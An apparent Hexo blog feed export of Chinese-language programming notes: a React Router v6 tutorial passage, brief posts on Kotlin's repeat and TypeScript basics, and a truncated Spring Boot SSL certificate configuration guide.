<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NavLink</span>, <span class="title class_">Routes</span>, <span class="title class_">Route</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Product</span> <span class="keyword">from</span> <span class="string">&quot;./Product&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">About</span> <span class="keyword">from</span> <span class="string">&quot;./About&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&quot;./Home&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Error</span> <span class="keyword">from</span> <span class="string">&quot;./Error&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;product&quot;</span>&gt;</span>产品<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;about&quot;</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Home</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/product&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Product</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/about&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">About</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;*&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Error</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果想要在所有 Route 都不匹配时就渲染 404 页面，只需将 404 页面对应的 Route 的 path 设置为 *：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;<span class="title class_">Routes</span>&gt;</span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Home</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;product&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Product</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;about&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">About</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line">  <span class="language-xml"><span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;*&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Error</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line">&lt;/<span class="title class_">Routes</span>&gt;</span><br></pre></td></tr></table></figure>

<h2 id="编程式导航"><a href="#编程式导航" class="headerlink" title="编程式导航"></a>编程式导航</h2><p>React Router 提供了两种不同的编程式导航方式：</p>
<p>声明式导航组件：<code>&lt;Navigate&gt;</code> 组件<br>命令式导航方法：<code>useNavigate</code> Hook</p>
<p>我们可以使用这两种编程的方式来跳转到指定的路由，也可以实现路由的重定向，比如在浏览器的地址栏输入一个 URL 并进行跳转时，如果应用中没有定义该路由，就跳转到应用的首页。</p>
<h3 id="Navigate"><a href="#Navigate" class="headerlink" title="Navigate"></a>Navigate</h3><p><code>&lt;Navigate&gt;</code>组件是一种声明式的导航方式。使用 Navigate 组件时，首先需要从 react-router-dom 导入 Navigate 组件。然后在 Navigate 组件中通过 to props 来指定要跳转的路径：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">NavLink</span>, <span class="title class_">Routes</span>, <span class="title class_">Route</span>, <span class="title class_">Navigate</span> &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Product</span> <span class="keyword">from</span> <span class="string">&quot;./Product&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">About</span> <span class="keyword">from</span> <span class="string">&quot;./About&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Home</span> <span class="keyword">from</span> <span class="string">&quot;./Home&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;&quot;</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;product&quot;</span>&gt;</span>产品<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">NavLink</span> <span class="attr">to</span>=<span class="string">&quot;about&quot;</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">NavLink</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;/&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Home</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;product&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Product</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;about&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">About</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">Route</span> <span class="attr">path</span>=<span class="string">&quot;*&quot;</span> <span class="attr">element</span>=<span class="string">&#123;</span>&lt;<span class="attr">Navigate</span> <span class="attr">to</span>=<span class="string">&quot;/&quot;</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">Routes</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样，当在浏览器地址栏输入一个未定义的路由时，就会要转到首页。</p>
<h3 id="useNavigate"><a href="#useNavigate" class="headerlink" title="useNavigate"></a>useNavigate</h3><p><code>useNavigate</code> Hook是一种命令式导航方式。使用这个 Hook 时，首先需要从 react-router-dom 中导入 <code>useNavigate</code>，然后传递给它需要跳转的路由即可。假如在提交完表单之后，跳转到主页，可以这样实现：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; useNavigate &#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Register</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> navigate = <span class="title function_">useNavigate</span>()</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">Form</span> <span class="attr">afterSubmit</span>=<span class="string">&#123;()</span> =&gt;</span> navigate(&#x27;/&#x27;)&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="通过路由传递状态"><a href="#通过路由传递状态" class="headerlink" title="通过路由传递状态"></a>通过路由传递状态</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//发送数据</span></span><br><span class="line">&lt;<span class="title class_">Link</span> to=<span class="string">&quot;/&quot;</span> state=&#123;<span class="string">&quot;From Product&quot;</span>&#125;&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接受数据</span></span><br><span class="line"><span class="keyword">import</span> &#123; useLocation &#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./styles.css&quot;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Settings</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> location = <span class="title function_">useLocation</span>();</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;App&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">header</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;location.state&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>引用自<a href="https://juejin.cn/post/7187199524903845946">React Router v6 完全指南</a></p>
</blockquote>
<h1 id="旧版本（类似vue一样的格式书写）"><a href="#旧版本（类似vue一样的格式书写）" class="headerlink" title="旧版本（类似vue一样的格式书写）"></a>旧版本（类似vue一样的格式书写）</h1><p><a href="https://reactrouter.com/en/main">最新官方网站</a><br>暂不支持中文,阅读起来稍显麻烦.<br><strong>该篇教程面向的是react router6.22.3的版本,并且使用的是ts</strong></p>
<blockquote>
<p>因为我也不是很懂,所以在看完一小部分后,准备写一个面向新手的教程(主要是怕自己以后忘了怎么写路由)</p>
</blockquote>
<h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">xxx是你的项目名称</span></span><br><span class="line">npx create-react-app xxx -template typescript</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装react-router-dom</span></span><br><span class="line">npm install react-router-dom@6.22.3</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">types暂时没有支持这么高的版本</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">npm instasll @types/react-router-dom@6.22.3</span></span><br></pre></td></tr></table></figure>

<p>index.tsx就是我们项目的入口地址:<br><img src="https://image.zfxt.top/hexo-blog/react-router%E9%80%9F%E6%88%90-2024-03-29-12-42-31.png" alt="react-router速成-2024-03-29-12-42-31"></p>
<p>我们进行以下的修改:</p>
<ol>
<li><p>简化App.tsx的内容</p>
 <figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">App</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> &gt;</span></span></span><br><span class="line"><span class="language-xml">    Hello react</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">App</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改index.tsx为这部分内容</p>
 <figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ReactDOM</span> <span class="keyword">from</span> <span class="string">&#x27;react-dom/client&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;./index.css&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> reportWebVitals <span class="keyword">from</span> <span class="string">&#x27;./reportWebVitals&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    createBrowserRouter,</span><br><span class="line">    <span class="title class_">RouterProvider</span>,</span><br><span class="line">    <span class="title class_">Route</span>,</span><br><span class="line">    <span class="title class_">Link</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&quot;react-router-dom&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//添加路由</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">createBrowserRouter</span>([</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//路径</span></span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">        <span class="comment">//元素(可以导入其他的元素,也可以直接编写一个html)</span></span><br><span class="line">        <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;/about&quot;</span>,</span><br><span class="line">        <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>About<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;/contact&quot;</span>,</span><br><span class="line">        <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Contact<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>,</span><br><span class="line">    &#125;,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> root = <span class="title class_">ReactDOM</span>.<span class="title function_">createRoot</span>(</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;root&#x27;</span>) <span class="keyword">as</span> <span class="title class_">HTMLElement</span></span><br><span class="line">);</span><br><span class="line">root.<span class="title function_">render</span>(</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">React.StrictMode</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    //绑定router</span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">RouterProvider</span> <span class="attr">router</span>=<span class="string">&#123;router&#125;/</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">React.StrictMode</span>&gt;</span></span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If you want to start measuring performance in your app, pass a function</span></span><br><span class="line"><span class="comment">// to log results (for example: reportWebVitals(console.log))</span></span><br><span class="line"><span class="comment">// or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitals</span></span><br><span class="line"><span class="title function_">reportWebVitals</span>();</span><br></pre></td></tr></table></figure></li>
</ol>
<p>以上就是最基础的路由配置,你已经入门了.</p>
<h2 id="子路由-Index"><a href="#子路由-Index" class="headerlink" title="子路由(Index)"></a>子路由(Index)</h2><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Outlet</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;react-router-dom&#x27;</span></span><br><span class="line">...</span><br><span class="line"> &#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;/about&quot;</span>,</span><br><span class="line">        <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>About</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">Outlet</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>,</span><br><span class="line">        <span class="attr">children</span>: [</span><br><span class="line">            &#123;<span class="attr">index</span>: <span class="literal">true</span>, <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Index<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>&#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">path</span>: <span class="string">&quot;me&quot;</span>,</span><br><span class="line">                <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>About me<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>,</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<p>子页面会展示在Outlet内.<br>子路由可以设定一个index元素,可以设置默认展示的子页面</p>
<h2 id="配置错误页面"><a href="#配置错误页面" class="headerlink" title="配置错误页面"></a>配置错误页面</h2><p>如这样配置,或者添加一个react元素,每次访问到没有的页面都会进入这个内容</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        <span class="attr">path</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">        <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">App</span>/&gt;</span></span>,</span><br><span class="line">        <span class="attr">errorElement</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>404<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span>,</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure>

<h2 id="动态路由-参数传递-loader"><a href="#动态路由-参数传递-loader" class="headerlink" title="动态路由,参数传递(loader)"></a>动态路由,参数传递(loader)</h2><h3 id="不使用loader-直接通过useParams来获取参数"><a href="#不使用loader-直接通过useParams来获取参数" class="headerlink" title="不使用loader,直接通过useParams来获取参数"></a>不使用loader,直接通过useParams来获取参数</h3><figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="title function_">createBrowserRouter</span>([</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// it renders this element</span></span><br><span class="line">    <span class="attr">element</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">Team</span> /&gt;</span></span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// when the URL matches this segment</span></span><br><span class="line">    <span class="attr">path</span>: <span class="string">&quot;teams/:teamId&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// with this data loaded before rendering</span></span><br><span class="line">    <span class="attr">loader</span>: <span class="title function_">async</span> (&#123; request, params &#125;) =&gt; &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">fetch</span>(</span><br><span class="line">        <span class="string">`/fake/api/teams/<span class="subst">$&#123;params.teamId&#125;</span>.json`</span>,</span><br><span class="line">        &#123; <span class="attr">signal</span>: request.<span class="property">signal</span> &#125;</span><br><span class="line">      );</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// performing this mutation when data is submitted to it</span></span><br><span class="line">    <span class="attr">action</span>: <span class="title function_">async</span> (&#123; request &#125;) =&gt; &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">updateFakeTeam</span>(<span class="keyword">await</span> request.<span class="title function_">formData</span>());</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// and renders this element in case something went wrong</span></span><br><span class="line">    <span class="attr">errorElement</span>: <span class="language-xml"><span class="tag">&lt;<span class="name">ErrorBoundary</span> /&gt;</span></span>,</span><br><span class="line">  &#125;,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//useParams</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Team</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> params = <span class="title function_">useParams</span>();</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(params.<span class="property">teamId</span>); <span class="comment">// &quot;hotspur&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们通过类似<code>&quot;teams/:teamId&quot;</code>的形式设置动态路由,如果要获取动态路由传递过来的参数,通常是使用<code>useParams()</code>的方法来获取</p>
<h3 id="使用loader"><a href="#使用loader" class="headerlink" title="使用loader"></a>使用loader</h3><p>我们使用loader,就不需要使用<code>useParams()</code>,他会自动替你执行useParams的方法,然后你只需解构就能获取参数,然后通过修改数据来传入更多的内容.<br>图示:<br><img src="https://image.zfxt.top/hexo-blog/react-router%E9%80%9F%E6%88%90-2024-03-29-13-12-39.png" alt="react-router速成-2024-03-29-13-12-39"><br>如果我们是使用vue的话,可能会获取参数后,在<code>mount</code>方法中,设置我们需要初始化的所有数据,而react帮我们把数据初始化的过程抽出来放在loader中</p>
<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="comment">//类似这样</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">function</span> <span class="title function_">Root</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; contacts &#125; = <span class="title function_">useLoaderData</span>();</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>contacts.data<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="action"><a href="#action" class="headerlink" title="action"></a>action</h2><p>这个功能可能用的不多,他会把你页面中原生的html的form表单全部捕获,原本发送到服务器的表单数据,会发送到action中,然后在进行细致的操作<br>我这里不详细讲,因为可能用的不多,想更多了解到可以看看官网</p>
]]></content>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title>repeat函数循环执行函数体</title>
    <url>/posts/d10d893f/</url>
    <content><![CDATA[<h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><p><code>kotlin</code><br>repeat(3){<br>  println(“hello,world”)<br>}</p>
<pre><code>他会将repeat中的函数体执行3遍
</code></pre>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>ts</title>
    <url>/posts/c3868e8b/</url>
    <content><![CDATA[<h1 id="TS入门"><a href="#TS入门" class="headerlink" title="TS入门"></a>TS入门</h1><p>typeScript 必须转译为 js才可以在浏览器中或者node中运行</p>
<p>转译器：tsc<br>命令进行ts到js的转译<br>安装tsc：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装</span></span><br><span class="line">npm install tsc -g</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用</span></span><br><span class="line">tsc code.ts</span><br></pre></td></tr></table></figure>

<p>相关语法：</p>
<ol>
<li>类型声明<br>他与kotlin的类型声明很相似<br>不同的是他的？用来确定他的参数是否需要传入<br>当然编译器可以自动推断出来</li>
<li>联合类型<br>他允许一个变量可以是多个类型<br>更多的使用是：<br>他也可以限制某个变量的取值，如<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">gender</span>: <span class="string">&#x27;male&#x27;</span> | <span class="string">&#x27;female&#x27;</span>；</span><br><span class="line">gender = <span class="string">&#x27;male&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
<li>函数类型<br>在ts中可以传入函数作为参数，这可以很好的作为回调使用</li>
<li>别名<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">UserID</span> = <span class="built_in">number</span> | <span class="built_in">string</span>;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>当我们要使用一些特定的第三方库，但是某些库可能对ts不那么支持，我们可是使用社区提供的特定类型包，这些包都有一个@types&#x2F;包名的前缀，<code>@types/three</code></p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>ts</tag>
      </tags>
  </entry>
  <entry>
    <title>springboot配置ssl证书</title>
    <url>/posts/3ad93a0f/</url>
    <content><![CDATA[<p>首先如何ssl证书可以从这篇文章中得到：<br><a href="%22https://zfxt.top/posts/f1d3065d/%22">白嫖永久泛域名证书</a></p>
<h2 id="配置springboot的ssl证书"><a href="#配置springboot的ssl证书" class="headerlink" title="配置springboot的ssl证书"></a>配置springboot的ssl证书</h2><ol>
<li><p>在resource目录下传入你的证书文件(.pem .cer .crt .jks .PFX)和密钥文件(.txt)<br> 如果你的证书文件不符合格式，也可以进行<a href="https://www.chinassl.net/ssltools/convert-ssl.html">ssl证书转化</a><br> 不同格式的ssl证书都是可以相互转化的</p>
</li>
<li><p>修改配置文件<br>在<code>application.yml</code>中配置你的ssl证书</p>
 <figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line"><span class="attr">port:</span> <span class="number">443</span>    <span class="comment">#HTTPS协议默认端口号为443，需要使用其他端口时，您可以在此处自定义。</span></span><br><span class="line"><span class="attr">ssl:</span></span><br><span class="line">    <span class="attr">key-alias:</span> <span class="string">tomcat</span>    <span class="comment">#证书别名</span></span><br><span class="line">    <span class="attr">key-store-password:</span> <span class="string">********</span>    <span class="comment">#填写jks-password.txt文件内的密码。</span></span><br><span class="line">    <span class="attr">key-store-type:</span> <span class="string">JKS</span> <span class="comment">#JKS格式证书密钥库类型。PFX格式的证书密钥库类型为PKCS12。</span></span><br><span class="line">    <span class="attr">key-store:</span> <span class="string">classpath:domain_name.jks</span>   <span class="comment">#您需要使用实际的证书名称替换domain_name.jks。</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>获取自己的证书别名（一般就是你的域名）<br>如果您忘记证书别名，您可以尝试通过JDK自带的密钥与证书管理工具keytool工具查询。命令示例为<code>keytool -list -v -keystore &lt;domain_name.jks&gt; -storepass &lt;password&gt;</code>。</p>
</li>
